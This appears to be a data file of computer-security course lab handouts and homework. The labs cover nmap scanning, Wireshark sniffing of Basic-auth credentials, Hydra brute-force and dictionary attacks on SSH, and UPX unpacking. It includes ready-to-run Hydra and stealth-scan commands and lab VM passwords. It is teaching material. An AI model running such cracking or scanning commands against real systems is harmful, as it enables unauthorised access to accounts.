â€œsudo apt-get updateâ€, then â€œsudo apt-get install tracerouteâ€ to install the traceroute utility. You may expect to see the screen as shown below. Q4: Type: â€œsudo traceroute www.unt.eduâ€. Attach a screenshot of the result. Q5: Summarize your observations in the previous question, and also explain why the symbol â€œ*â€ is shown. (You are allowed to do the Internet search, when looking for answers to this question.) 3. The traceroute functionality by default sends UDP packets with destination port from a certain range (which normally has no service associated with it) and then uses a reply with ICMP Destination Unreachable messages to compute the route. As routers may block these messages, an alternative may be to use ICMP Echo Reply messages generated using the option â€œ-Iâ€. Q6: Use the command â€œsudo traceroute -I www.unt.eduâ€. Attach a screenshot and summarize your observations. Student Name: Course: CSCE 5550 Semester: Fall 2022 Network Scanning Lab Remark: If tracing gets stuck at a certain hop, you may press â€œCtrl + Câ€ to stop the traceroute. 4. An alternative approach is to use TCP SYN packets: Q7: Use the command â€œsudo traceroute -T www.unt.eduâ€. Attach a screenshot and summarize your observations. For more information on the traceroute tool, check the manual by typing â€œtraceroute --helpâ€ in the command line. NMAP Nmap is a free, open-source tool that quickly and efficiently performs ping sweeps, port scanning, service identification, IP address detection, and operating system detection. Nmap has the benefit of scanning a large number of machines in a single session. It is supported by various operating systems, including Unix, Windows, and Linux. The state of a port, as determined by an Nmap scan, can be â€œopenâ€, â€œfilteredâ€, or â€œunfilteredâ€. â€œOpenâ€ means that the target machine accepts incoming requests on that port. â€œFilteredâ€ means that a firewall or network filter is screening the port and preventing Nmap from discovering whether it is open. â€œUnfilteredâ€ mean the port is determined to be closed, and no firewall or filter is interfering with the Nmap results. Types of Nmap scans TCP Connect: The user makes a full TCP connection to the target system. This types of scan is the most reliable but also the easiest to detect. Open ports reply with an SYN/ACK while closed ports reply with an RST/ACK packet. TCP connect scans can be slow since a full connection is attempted. XMAS Tree: The scanner checks for TCP services by sending the so-called XMAS-tree packets, which are so named because all the â€œlightsâ€ are on, meaning that the FIN, URG, and PSH flags are set. These flags are bits that signify various connection settings for TCP packets. Closed ports reply with an RST flag. SYN Stealth Scan: This is also known as half-open scanning. The attacker sends a SYN packet and receives a SYN/ACK back from the server. It is considered stealthy because a full TCP connection is not opened. Open ports reply with a SYN/ACK while closed ports reply with an RST/ACK. Student Name: Course: CSCE 5550 Semester: Fall 2022 Network Scanning Lab Null Scan: This is an advanced scan that may be able to pass through firewalls undetected or modified. Null scan has all flags off or not set. It only works on Unix systems. Closed ports will return an RST flag. Windows Scan: This type of scan is similar to the ACK scan (described next) and can also detect open ports. ACK scan: This type of scan is used to map out firewall rules. ACK scan only works on Unix. The port is considered filtered by firewall rules if an â€œICMP Destination Unreachableâ€ message is received as a result of the ACK scan. Now that we discussed some of the types of scans which are available in Nmap, let us go over some of the command option that allow us to enable them. Similar to â€œhping3â€, Nmap is a command-line based tool. The syntax is similar to the standard Linux commands: Type â€œnmapâ€, the options, specific ports if any, and then the target IP address or domain name. The options can be used in a wide variety of combinations; the popular ones are listed below. â€¢ TCP connect scan: -sT â€¢ SYN scan: -sS â€¢ XMAS scan: -sX â€¢ Ping scan: -sP â€¢ UDP scan: -sU â€¢ RPC scan: -sR â€¢ List DNS: -sL â€¢ TCP ping: -PT â€¢ SYN ping: -PS â€¢ ICMP ping: -PI â€¢ No ping: -Pn (skip the host discovery, i.e., scan IP address(es) without pinging them first.) â€¢ OS discovery: -A By default, Nmap scans the top 1000 most common ports. One can specify ports using the option â€œ-p [ports]â€, to scan all ports use â€œ-p-â€. Next, let us discuss how to scan all the live hosts on the same network. Note that some of the scans might take a few minutes to run. NMAP Examples: Open a terminal. Q8: Run the command â€œnmap -sP www.unt.eduâ€ (wait some time for it to complete). Attach a screenshot of the result. Explain your observations. Note the IP address shown by the above command, and let us use it for the next two questions. We will denote it by [IP-address] in the commands. Student Name: Course: CSCE 5550 Semester: Fall 2022 Network Scanning Lab Q9: Run the command â€œsudo nmap -sS -PN -A [IP-address]â€ (wait some time for it to complete). Attach a screenshot of the result. Remark: Let us review the options that we use: â€œ-sSâ€ will switch on a SYN scan in a stealth mode, â€œ-PNâ€ will force scanning of the host without pinging it first, and â€œ-Aâ€ will switch on OS detection. Q10: Based on the output of the above command, what type of device are you facing? Next, let us scan another website â€“ the Nmap test server. Q11: Run â€œsudo nmap -sS -PN -A scanme.nmap.orgâ€. Attach a screenshot of the result. What is an OS on the machine that hosts â€œscanme.nmap.orgâ€? The OS discovery information in the previous command may be unreliable, but given other information it is easy to guest the scanned host OS. For scanning specific ports or port ranges use the â€œ-pâ€ option. Let us scan for port 22, which is typically assigned to SSH. Q12: Run â€œsudo nmap -sS -p 22 scanme.nmap.orgâ€. Attach a screenshot of the result."
INTRO TO COMPUTER SECURITY,3550,Network Security,"Homework 5 Due: 11:59 PM on Wednesday, April 6, 2022 Form of submission: PDF, Word, or Text Document in Canvas â¦ (16 Points) Consider the following network: As a security analyst, you want to deploy an IDS to determine if any attackers penetrate this network. â¦ Where should the IDS monitors be placed in this networkâ€™s topology. Note that you may place more than one. Justify your answer. â¦ If you wanted to protect against insider attacks (i.e., attacks from inside this network), how would your answer in (a) change? Or would it? Be specific. Justify your answer. â¦ (12 Points) Telecommunications network providers and users are concerned about the single point of failure in â€œthe last mile,â€ which is the single cable from the network providerâ€™s last switching station to the customerâ€™s premises. How can a customer protect against that single point of failure? Comment on whether your approach presents a good cost-benefit trade-off. â¦ (12 Points) The open systems interconnection (OSI) model is inefficient; each layer must take the work of higher layers, add some result, and pass the work to lower layers. This process ends with the equivalent of a gift (i.e., payload) inside seven nested boxes, each one wrapped and sealed. Surely this wrapping (and unwrapping) is inefficient. From a security perspective, describe two advantages of the layered approach. â¦ (12 Points) A port scanner is a tool useful to an attacker to identify possible vulnerabilities in a potential victimâ€™s system. Cite a situation in which someone who is not an attacker could use a port scanner for a non-malicious purpose. â¦ (12 Points) How can a website distinguish between lack of capacity and a denial-of-service attack? For example, websites often experience a tremendous increase in volume of traffic right after an advertisement with the siteâ€™s URL is shown on television during the broadcast of a popular sporting event. That spike in usage is the result of normal access that happens to occur at the same time. How can a site determine that high traffic is reasonable? â¦ (12 Points) Suppose you have a high-capacity network connection coming into your home, and you also have a wireless network access point. Also suppose you do not use the full capacity of your network connection. List three reasons you might still want to prevent an outsiderâ€™s obtaining free network access by intruding into your wireless network. â¦ (12 Points) Should a network administrator put a firewall in front of a honeypot? Why or why not? â¦ (12 Points) Why does a stealth mode IDS need a separate network to communicate alarms and to accept management commands?"
INTRO TO COMPUTER SECURITY,5550,Packet Sniffing,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Packet Sniffing Lab Lab 1b: Packet Sniffing This lab uses the Kali 2020 virtual machine (VM). The credentials are: Username: osboxes Password: osboxes.org IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. â€¢ Login to the Kali 2020. â€¢ Open the terminal and start Wireshark: type â€œwiresharkâ€ NOTE: If you close the Wireshark application, remember to start it using the â€œwiresharkâ€ command. (Do not use the menu to start Wireshark, because then you may not have the root privileges and so the packet capture may not work.) â€¢ Select the interface eth0 in the window and click Capture Â® Start (or the blue fin button â€“ as shown on the screenshot below) to start sniffing. Student Name: Course: CSCE 5550 Semester: Fall 2022 Packet Sniffing Lab Note: If no network applications are running on your VM, no packets will be captured. So, let us generate some packets as follows: â€¢ Open Firefox (Application Â® Favorites Â® Web Browser) and browse a website â€œwww.unt.eduâ€. Q1: Use the filter http.host==www.unt.edu (as shown on the screenshot below). What is an IP address of the website? Attach a screenshot of the result. â€¢ Using the same filter, expand the HTTP bar as shown below Use the information displayed by Wireshark to find out the following information. Q2: What browser (software client) was used in this HTTP request? (Attach a screenshot supporting your answer.) Q3: What is the clientâ€™s OS? (Attach a screenshot supporting your answer.) Q4: Which flags were set in the Transmission Control Protocol (TCP)? Explain why those flags were set. â€¢ Stop the packet capture in Wireshark using the red square button (see the screenshot below). â€¢ Start a new capture in Wireshark. (You may choose a â€œContinue without savingâ€ option when prompted.) Student Name: Course: CSCE 5550 Semester: Fall 2022 Packet Sniffing Lab â€¢ Browse the website cse.unt.edu/downloads/vm and login with the following credentials: username: vmdownload password (bold are numbers): d0wnloadVMf1les! â€¢ Stop the capture in Wireshark. â€¢ Filter packets with http.host==cse.unt.edu â€¢ Right-click on the HTTP packets, choose Follow Â® HTTP Stream, and you will see a stream as shown in the below picture. â€¢ Inspect the packets this way until you see that the following line: Authorization : Basic <encoded message> Q5: Attach a screenshot of the HTTP stream where you found the encoded credentials. Note: These credentials are encoded using base64 but not encrypted, therefore we can simply decode them as follows. â€¢ Decode <encoded authentication credential> using base64 decoder to get the password and username. For that, in the top window, select the HTTP packet that contains the credentials. In the middle window, select the line starting with â€œAuthorizationâ€. Then, Analyze Â® Show Packet Bytesâ€¦ In the new window, you will see the line â€œAuthorization : Basic <encoded message>â€. Since you only need the credential to be decoded, set the â€œStartâ€ field to â€œ21â€ and the â€œEndâ€ field to â€œ57â€ to select the credential data, and set â€œDecode asâ€ option to â€œBase64â€. Student Name: Course: CSCE 5550 Semester: Fall 2022 Packet Sniffing Lab Q6: Attach a screenshot of the decoded credentials. Note: In practice, you may have to do a little research in order to figure out how to perform decoding. The above item provides an end point of this â€œlittle researchâ€ in order to give you a shortcutâ€”to skip technical details and save time. Now, start a new capture in Wireshark. Browse the website â€œcanvas.unt.eduâ€ and login with your EUID and password. Stop the packet capture in Wirehark. Use the filter â€œhttp.host ==canvas.unt.eduâ€. Check the HTTP stream for all the (outgoing) HTTP packets, you will see a stream as shown below: Q7: Can you find your credentials on the stream? Explain your answer. Hint for the above question: Perform the following steps. Run the terminal and ping â€œcanvas.unt.eduâ€ to find out its IP address â€“ we will denote the value which you found as [ip-address]. Set the filter in the Wireshark as follows â€œip.host==[ip-address]â€. Observe what protocol was used for communication between your browser and the Canvas website."
INTRO TO COMPUTER SECURITY,3550,Password Cracking 1,"Lab 5b: Password Cracking Lab This lab uses the Ubuntu 20.04 virtual machine (VM) as an OVA file cscelab.ova on Canvas. The credentials are as follows: Username: sec-lab Password: untccdc NOTE 1: For your lab report, you need to reply questions which are marked in red. NOTE 2: Make sure that your hostname is your EUID with a â€˜labâ€™ suffix and for your default user, use your EUID. For example, assuming your EUID is ab1234, the computer name (hostname) would be ab1234lab and the user would be ab1234. NOTE 3: When it is required to â€œattach a screenshotâ€, feel free to attach several screenshots if needed. If the screenshot requires your terminal and commands, you need to make sure that your hostname and username are clearly visible. NOTE 4: When you are running a command, you have to be extra careful. Especially when you are applying an attack, if you provide a wrong command or parameter, you may cause a bigger harm than expected. Therefore, you are responsible for your commands. Objectives The objective of this lab is to apply both brute-force and dictionary attacks using a famous password cracker tool called Hydra. Our scenario will be as follows: You are an attacker who has access to the computer and you are interested in finding the password of the other user(s). You observed that there is SSH login only; so, you will try with brute-force attack and also the dictionary attack. Hydra supports many protocols, including (but not limited to) FTP, HTTP, HTTPS, MySQL, MSSQL, Oracle, Cisco, IMAP, VNC, and many more. One should note however that this type of attack may be detected due to multiple login attempts. We can use Hydra through the terminal or the GUI application (xHydra); however, the terminal gives us more flexibility and control. Therefore, the lab will contain only terminal based work from now on. Brute-Force attack First of all, we will try brute-force attack, which requires trying all possible combinations. As you can imagine, this is a time-consuming process, especially if you donâ€™t have any clues on the password. Our victim will be the user: test. Assuming that we donâ€™t know its password, we will be trying all the possibilities. As this is not feasible for a short amount of time, instead we will do an educated guess: i.e., the password for the user test has only three lower case letters. Hydra runs as follows: hydra <parameters> <IP> <PROTOCOL>. Since we are applying attack to another user on the same computer, we will use 127.0.0.1 for IP and for the PROTOCOL, we will use SSH. You can find all the possible parameters for Hydra through â€˜man hydraâ€™, but we are going to run using multiple threads (-t <#THREADS> and we can use 4), declare the username (-l <USERNAME> -- in our case, the username is test), and we will ask Hydra to generate all the combinations for us through -x parameter (-x MIN:MAX:LETTERS format where min and max number of letters are given and then the type of the letters are provided. For our case, we know that it is using three letters only so both min and max will be 3. And, we know that it only has lower-case letters, we will use â€˜aâ€™. Hence, our input will be 3:3:a. If we had upper case only, then it would be 3:3:A or we had lower and upper case three characters 3:3:aA. We could even include numbers, such as 3:3:aA1). We are also interested in the execution time, so we are going to note how long it takes to try using time command. In conclusion, our command will be as follows: time hydra -t 4 -l test -x 3:3:a 127.0.0.1 ssh When it finds the password, you can exit the execution by pressing CTRL-C. Q1: Provide a screenshot of your running code. Q2: How long did it take to run? Q3: What is the found password? Dictionary attack Not always we are this lucky to get the clues for the password. However, there are other options. For example, when we search a bit, we can see that there are some commonly used passwords (they are found through studies after breaches occur). You can find multiple lists online. Now, we will try a commonly used password list instead of brute-force attack (-P <password_list>). Hence, following is our command now: time hydra -t 4 -l test -P /opt/hydra/common_passwd.txt 127.0.0.1 ssh Q4: Provide a screenshot of your running code. Q5: How long did it take to run? Q6: A bit of research time: Search the web and find the most commonly used 10 passwords. What are they? What is common for them?"
INTRO TO COMPUTER SECURITY,5550,Password Cracking 2,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Password Cracking Lab Lab 5b: Password Cracking Lab In this lab, you will be using the Ubuntu 20 VM. The credentials are: Username: sec-lab Password: untccdc NOTE: Address all the questions (Q1, Q2, etc.) marked in bold. When a screenshot is requested, try to fit all the results in one image. If this is not possible, then attach multiple screenshots. When a question is asked, e.g. â€œWho is the owner of the file?â€, type your answer, do not simply provide a screenshot. IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. Objectives The objective of this lab is to apply both brute-force and dictionary attacks using a popular password cracker tool called Hydra. Our scenario will be as follows: You are an attacker who has access to the computer and you are interested in finding the password of another user(s). You observed that there is SSH login only; so, you will try the brute-force attack and the dictionary attack. Hydra supports many protocols, including (but not limited to) FTP, HTTP, HTTPS, MySQL, MSSQL, Oracle, Cisco, IMAP, VNC, and many more. One should note however that this type of attack may be detected due to multiple login attempts. We can use Hydra through the terminal or the GUI application (xHydra); however, the terminal gives us more flexibility and control. Therefore, we will use the latter option in this lab. Section 1: Brute-Force attack First of all, we will try the brute-force attack, which requires trying all possible combinations. As you can imagine, this is a time-consuming process, especially if you do not have any clues on the password. Student Name: Course: CSCE 5550 Semester: Fall 2022 Password Cracking Lab Our victim will be the user test. Assuming that we do not know their password, we will be trying all the possibilities. As this is not feasible for a short amount of time, instead we will make an educated guess that the password for the user test has only three lower case letters. Hydra runs as follows: hydra <parameters> <IP> <PROTOCOL>. Since we are applying attack to another user on the same host, we will use 127.0.0.1 for IP and for the PROTOCOL, we will use SSH. (You can find all the possible parameters for Hydra through â€˜man hydraâ€™.) In this lab, we will use multiple threads (-t <#THREADS>, and we can use 4), declare the username (-l <USERNAME> â€“ in our case, the username is test). Also, we will ask Hydra to generate all the combinations for us through -x parameter (-x MIN:MAX:LETTERS format, where min and max number of letters are given and then the type of the letters are provided). For our case, we know that it is using three letters only so both min and max will be 3. Moreover, we know that it only has lower-case letters, so we will use â€˜aâ€™. Hence, our input will be 3:3:a. If we had upper case only, then it would be 3:3:A, or if we had both, it would be 3:3:aA. We could also include numbers, such as 3:3:aA1. We are also interested in the execution time, so we are going to note how long it takes for this command to run. In conclusion, our command will be as follows: time hydra -t 4 -l test -x 3:3:a 127.0.0.1 ssh When it finds the password, you can exit the execution by pressing Ctrl-C. Q1: Attach a screenshot of the result. Q2: How long did it take the attack to run? Q3: What is the found password? Section 2: Dictionary attack The attacker is often not lucky enough to get the clues for the password. In this case, the attacker may rely on the fact that there are some commonly used passwords (they are found through studies of the breaches, which occurred in practice). Multiple such lists are available online. Now, we will try a commonly used password list instead of the brute-force attack (-P <password_list>). Run the following command: time hydra -t 4 -l test -P /opt/hydra/common_passwd.txt 127.0.0.1 ssh Q4: Attach a screenshot of the result. Q5: How long did it take the attack to run? Q6: Search the web and find the five most commonly used passwords from the 2009 Rockyou password list. (Provide these five passwords.)"
INTRO TO COMPUTER SECURITY,3550,"Programs, Programming","Homework 2 Due: 11:59 PM on Friday, February 18, 2022 Form of submission: Word, Text, or PDF Document in Canvas Chapter 3 â€“ Programs and Programming (Security in Computing, 5/e) (12 Points) A program is written to compute the sum of the integers from 1 to 10. The programmer, well trained in reusability and maintainability, writes the program so that it computes the sum of the numbers from k to n. However, a team of security specialists scrutinizes the high-level code. The team certifies that this program properly sets k to 1 and n to 10; therefore, the program is certified as being properly restricted in that it always operates on precisely the range 1 to 10. List at least two different ways that this program can be sabotaged so that during execution it computes a different sum, for example, 3 to 20. (12 Points) Without your knowledge, a malicious Trojan horse has been planted in your default web browser that you frequently use to access your bank account online. The attacker that planted the Trojan horse already set up the backdoor to silently capture your account number and password, but he/she needs a way to get this information off of your computer and sent across the network to himself/herself. List two covert channels that the attacker can use to leak information about your bank accounts to himself/herself somewhere in the network. You may assume that the attacker can arrange to host a web site that you will visit or even sniff HTTP GET requests. There are lots of possibilities â€“ be creative, but be specific to this scenario! (12 Points) List three controls that could be applied to detect or prevent off-by-one errors. (12 Points) Explain in what circumstances penetrate-and-patch is a useful program maintenance strategy. (12 Points) Explain why genetic diversity is a good principle for secure development. Cite an example of lack of diversity that has had or can have a negative impact on security. (6 Points) (a) You receive an e-mail message that purports to come from your bank. It asks you to click a link for some reasonable-sounding administrative purpose. How can you verify that the message did come from your bank? (6 Points) (b) Now play the role of an attacker. Suppose you are able to obtain the mailing list for a certain bank. Describe what is needed to convert the e-mail message to your purposes, while still making both the bank and the customer think the message is authentic and trustworthy? Be sure to address perspectives that include both the message and the bankâ€™s web site. (12 Points) Open design would seem to favor the attacker, because it certainly opens the implementation and perhaps also the design for the attacker to study. Justify that open design overrides this seeming advantage and actually leads to solid security. (16 Points) Consider the following code snippet in C: char *base_url = malloc(11 * sizeof(char)); printf(""Enter an 11 character URL: ""); scanf(""%s"", base_url); char src[11]; char dst[11]; // copies base_url to src strncpy(src, base_url, 11); // copies src to dest strcpy(dst, src); printf(""src: %s dst: %s\n"", src, dst); Identify at least one potential buffer overflow vulnerability and explain why/how it can be exploited (i.e., not just that itâ€™s a buffer overflow, but where the problem will manifest itself). Rewrite the code in C that would prevent or mitigate the impact of this deficiency. Note that you may not change the first 5 lines of code."
INTRO TO COMPUTER SECURITY,3550,Reverse Engineering,"Lab 4: Reverse Engineering Lab Signature-based detection is a process where a unique identifier (i.e., a signature) is established about a known threat so that the threat can be identified in the future. In the case of a virus scanner, this is typically a unique pattern of code that attaches to a file, or it may be a hash of a known bad file. Attackers may use a runtime packer, or self-extracting archive, to obfuscate malware in an effort to hide its existence from signature-based anti-virus software. However, we will see in this lab that even after applying obfuscation, software code can still be cracked and viewed. Today, in this lab we are going to use a tool-based technique to unpack a UPX-packed executable to reveal the original program structure. First, letâ€™s see how using a runtime packer affects the following ""Hello World"" program in C++: Type up this small program as HelloWorld.cpp on your Windows machine and compile, calling the resulting executable HelloWorld.exe. IDA Freeware If IDA Freeware is not already downloaded on your Windows machine: â¦ Go to â¦ https://hex-rays.com/ida-free/#download â¦ Select IDA Freeware for Windows, which should start the downloading process. â¦ Install on your machine (following the instructions). We will use IDA Freeware, an interactive disassembler often used in reverse engineering, to see how packing software affects the executable. Letâ€™s disassemble the HelloWorld.exe file to see what it looks like: â¦ Start IDA Freeware. â¦ Click New to ""Disassemble a new file"" and select the HelloWorld.exe file. â¦ In the Load a new file dialog box, select Portable executable forâ€¦ and leave all other defaults as is. If you get a prompt to load DWARF debug information, leave the defaults as is and select Yes. â¦ Under the IDA View-A tab on the right, you should see some assembly instructions with the ""Hello World!"" text clearly visible. â¦ Note that if you do not see the assembly code with the ""Hello World!"" text in the IDA View-A tab on the right, you can select the _main function name in the left Functions box, which should make it visible in the IDA View-A tab. Q1: Attach a screenshot of the entire IDA Freeware application, including the title bar (with your EUID and the name of the file), Function box, and assembly code in IDA View-A tab. â¦ In IDA Freeware, select File Close to close the executable file in IDA Freeware, and when prompted to save the database, check the DON'T SAVE the database box and click OK. You can leave the IDA Freeware application open as we will be back to using it in just a little bit. Ultimate Packer for eXecutables (UPX) If UPX is not already downloaded on your Windows machine: â¦ Go to https://github.com/upx/upx/releases/tag/v3.96 â¦ Select the appropriate version for your machine (e.g., upx-3.96-win64.zip), which should start the downloading process. â¦ Extract the ZIP file to a selected location on your Windows machine. We will use Ultimate Packer for eXecutables (UPX), a free, opensource executable packer used to reduce the size of programs and DLLs, to ""pack"" our executable in an effort to obfuscate the codeâ€™s footprint (i.e., signature). Programs and libraries compressed by UPX are completely self-contained and run exactly as before, with no runtime or memory penalty for most of the supported formats. â¦ Pack the HelloWorld.exe executable using UPX using the â€“9 compression level option as shown in the example, saving the resulting packed executable as HelloWorld_packed.exe. If successful, the results of the UPX command should look something like this, where the file size is visibly reduced: â¦ Now, open up this new packed executable HelloWorld_packed.exe in IDA Freeware using the same options as before. You should notice a warning similar to the following, which indicates that the executable is most likely ""packed"". Click OK. You should notice that the sections are reduced to maybe a couple UPX segments, which means that it may be more difficult (but not impossible) to determine what this executable does! Q2: Attach a screenshot of the Functions box showing the UPX segments in the IDA Freeware application. â¦ In IDA Freeware, select File Close to close the executable file in IDA Freeware, and when prompted to save the database, check the DON'T SAVE the database box and click OK. Download the SimpleNum_packed.exe file to your Windows VM and run it to see what it does, paying close attention to the strings that are displayed to the terminal. â¦ With the IDA Freeware application still open, select File Open to disassemble the given file SimpleNum_packed.exe, using the same options as before. Again, you should notice a warning that indicates that the executable is most likely ""packed"" as before. Verify that the sections are reduced to maybe a couple UPX segments similar to what you observed in your HelloWorld_packed.exe file. Q3: Attach a screenshot of the one assembly code box in the IDA View-A tab with the text sp-analysis failed, meaning that the stack analysis failed since the stack pointer does not point to the address expected by the function type (since the executable was packed). â¦ In IDA Freeware, select File Close to close the executable file in IDA Freeware, and when prompted to save the database, check the DON'T SAVE the database box and click OK. â¦ Now, exit the IDA Freeware application. x32dbg If x32dbg is not already downloaded on your Windows machine: â¦ Go to https://x64dbg.com/ â¦ Click the Download button, and then select the appropriate version for your machine (e.g., snapshot_2022-10-18_22-09.zip), which should start the downloading process. â¦ Extract the ZIP file to a selected location on your Windows machine. We will use x32dbg, which is an open-source binary debugger for Windows that is aimed at malware analysis and reverse engineering of executables that you do not have the source code for. In particular, we want to use a ""breakpoint trick"" to see if we can restore the original binary. And while this should work with almost any debugger, we will use x32dbg for this one. Letâ€™s run this debugger on the SimpleNum_packed.exe file to see what it looks like: â¦ Start x32dbg. â¦ In x32dbg, select File Open to open the SimpleNum_packed.exe executable file. When loading is complete, you should initially be positioned at the Extended Instruction Pointer, EIP, under the CPU tab. However, x32dbg will put a breakpoint at pushad or EntryPoint of your binary by default that pushes the contents of the general-purpose registers onto the stack. To see this entry breakpoint, simply select the Breakpoints tab. Q4: Attach a screenshot of all of the default breakpoints in the debugger for this executable. Be sure to include the x32dbg window header information with the name of the executable and process ID (i.e., PID). â¦ Now, in your list of breakpoints, double-click on the pushad operation to take you to this location. â¦ Then, scrolling down the binary a little bit (about 178 lines or so), search for the first jmp perhaps only a few lines down from the popad and set your breakpoint there. â¦ The popad operation pops all general-purpose registers. You can set the breakpoint by placing your cursor on the currently gray dot to the left of the instruction address for the jmp instruction (hovering over the gray dot should reveal a pop-up window that indicates ""Breakpoint Not Set""). Click the gray dot until it turns red, indicating ""Breakpoint Enabled"". This action should also turn the instruction address red. Q5: Attach a screenshot of the binary instructions from the popad instruction to the jmp instruction where the breakpoint was set. Again, be sure to include the x32dbg window header information with the name of the executable and process ID (i.e., PID). We are going to search for the OEP (Original Entry Point) of the packed binary. â¦ Run the program until it hits the jmp breakpoint. You can run the program by selecting Debug Run, or clicking on the blue arrow facing the right in the x32dbg toolbar. Note that you may have to perform Debug Run several times to get to your jmp breakpoint, if there are more breakpoints already set. â¦ Now, single step into the jmp one time, which will take you to the OEP of the packed binary and take note of the instruction address, which should be a sub instruction. This can be done by selecting Debug Step into, or clicking on the blue arrow facing down to a blue circle. Q6: Attach a screenshot of the binary instructions from the sub instruction to include six lines or so, making sure to include a couple of the comments that indicate EntryPoint. Again, be sure to include the x32dbg window header information with the name of the executable and process ID (i.e., PID). We are going to dump the PE (Portable Executable) starting from its OEP using the Scylla plugin for x32dbg. This should already be included in your x32dbg and is shown here circled in red: â¦ With the EIP pointing to this address, click on this 'S' button in your toolbar that should bring up a new window for Scylla. â¦ In the Attach to an active process box, select your current process, which should be for SimpleNum_packed.exe and make sure your OEP is correct (i.e., the instruction address you found when stepping into the jmp instruction). Q7: Attach a screenshot of the Scylla dialog box, showing the current process selected as well as the correct OEP address. â¦ Then, click the IAT Autosearch button to scan for imports. Click Yes when prompted for advanced results. Click OK in the IAT found dialog box. â¦ When completed, click the Get Imports button to list all the imports found. Q8: Attach a screenshot of the Scylla dialog box, showing the results of the Get Imports listing. â¦ Click the Dump button to dump the extracted binary. This should bring up a Save As dialog box. Save the binary file as SimpleNum_packed_dump.exe, which should already be filled in. â¦ Finally, click the Fix Dump button and select the recently dumped SimpleNum_packed_dump.exe binary to fix its IAT. You should now have the SimpleNum_packed_dump_SCY.exe file in your directory, which is the final unpacked binary that we can open in IDA Freeware and compare the call graphs. â¦ Start IDA Freeware and then click New to ""Disassemble a new file"" and select the SimpleNum_packed_dump_SCY.exe file. â¦ In the Load a new file dialog box, select Portable executable forâ€¦ and leave all other defaults as is. Although IDA Freeware still indicates that the file was most likely packed, click OK as we shall see otherwise! Unlike before (when we opened the original SimpleNum_packed.exe file in IDA Freeware), we should see a number of functions in the left Function name box. Remembering the strings you noted from running the packed version of this executable, double-click on the functions in the list until you find the call graph that includes all of the original strings found in the executable, which shows our original program structure! Q9: Attach a final screenshot of the Functions box and call graph, with the ""function"" selected that shows the call graph of the function with the original strings from the program. Again, be sure to include the x32dbg window header information with the name of the executable and process ID (i.e., PID). â¦ In IDA Freeware, select File Close to close the executable file in IDA Freeware, and when prompted to save the database, check the DON'T SAVE the database box and click OK. â¦ Now, exit the IDA Freeware application."
INTRO TO COMPUTER SECURITY,3550,Secure Computing,"Homework 1 Due: 11:59 PM on Friday, February 4, 2022 Form of submission: Word, Text, or PDF Document in Canvas Chapter 1 â€“ Introduction (Security in Computing, 5/e) Note that #6 is required, but no points will be deducted for your answer to this problem (unless it is not completed). Read the following entry in Wikipedia: https://en.wikipedia.org/wiki/Digital_footprint and recall our discussion on â€œdigital footprintâ€ to answer the following questions: Briefly describe two advantages of having a digital footprint. Now, briefly describe two disadvantages of having a digital footprint. Distinguish between vulnerability, threat, and control. For each of the following, decide whether the description is a vulnerability, a threat, or an attack. Company XYZ is running an out-of-date version of the Apache web server. Jennifer has just finished programming a new virus. James is hacking into the web server of Company ABC. List at least three kinds of harm a company could experience from electronic espionage or unauthorized viewing of confidential company materials. One control against accidental software deletion is to save all old versions of a program. Of course, this control is prohibitively expensive in terms of cost of storage. Suggest a less costly control against accidental software deletion. Is your control effective against all possible causes of software deletion? If not, what threats does it not cover? Do you think attempting to break in to (that is, obtain access to or use of) a computing system without authorization should be illegal? Why or why not? Provide an example of a situation in which each of the following statements is true. Prevention is more important than detection and recovery. Detection is more important than prevention and recovery. Recovery is more important than prevention and detection. When you say that software is of high quality, what do you mean? How does security fit into your definition of quality? For example, can an application be insecure and still be â€œgoodâ€? Consider a program that allows consumers to order products from the web. Who might want to attack the program? What types of harm might they want to cause? What kinds of vulnerabilities might they exploit to cause harm?"
INTRO TO COMPUTER SECURITY,3550,Secure Software Development,"CSCE 3550 Foundations of Cybersecurity Spring 2022 1 Project 1 Due: 11:59 PM on Friday, March 4, 2022 PROGRAM DESCRIPTION: For this project, you will implement a simple â€œsecureâ€ system in any object-oriented programming language supported on our Linux CSE machines following the Bell-LaPadula (BLP) security rules â€“ simple security and the *-property â€“ in addition to following strong tranquility. Your system will have subjects and objects. Each subject can make a request to access an object, but first gets checked by a reference monitor. The monitor makes a decision to allow or deny by referring to the security levels of the subject as well as the object the subject is trying to access. This security mechanism can be described as follows: Item Description Subject Entity requesting access. Object The resource to which the subject is requesting access. Reference Monitor â€“ Access Control Enforcement Function Intercepts all subject requests to access control objects and implements the decisions as to whether these requests will be granted or denied. Access Control Decision Function Makes the decision as to whether the access request will be granted or denied. Both subjects and objects should be implemented as separate classes and contain only name (string) and value (integer) member data, where both the subjectâ€™s and objectâ€™s integer value are initially 0. Subjects and objects can be added to the system using the ADDSUB and ADDOBJ commands, respectively, that includes the name and security level, where the security level can be LOW, MEDIUM, and HIGH as follows: ADDSUB subject_name security_level ADDOBJ object_name security_level Except for requiring a valid syntax, ADDSUB and ADDOBJ are not subject to security rules (i.e., any syntactically valid ADDSUB and ADDOBJ should be passed to the reference monitor to add the subject and object, respectively). Subjects can perform READ and WRITE operations on objects as follows: READ subject_name object_name WRITE subject_name object_name value CSCE 3550 Foundations of Cybersecurity Spring 2022 2 For a READ, the subject reads the current value of the object and saves that value into its integer variable (a subsequent READ will change that value to the new one being read). Essentially, the subjectâ€™s integer variable will contain the value the subject most recently read. When a subject does a WRITE, the objectâ€™s value is updated to the value specified. One final command to print the current state of both subjects and objects is supported as follows: STATUS STATUS is not subject to security rules, meaning that any syntactically valid STATUS should simply pass through the reference monitor without needing to be validated. The input to your system is simply a file of commands. You will read successive lines from the file and parse each into an instruction object (perhaps a struct or class). Commands are not case-sensitive (even subject and object names). Arbitrary whitespace is allowed in commands, though you may assume that each command is on one line. You must perform error checking for any file operations. Be sure to deal with the possibility of errors in the instructions (i.e., incorrect ADDSUB, ADDOBJ, READ, WRITE, or STATUS, wrong number/type of arguments, etc.). For syntactically illegal instructions, you will indicate that it is a Bad Instruction and print out the illegal command, but you will not pass it to the reference monitor as described below. To add security to the system, both subjects and objects are given associated security levels. These levels are maintained by a RefMon class object 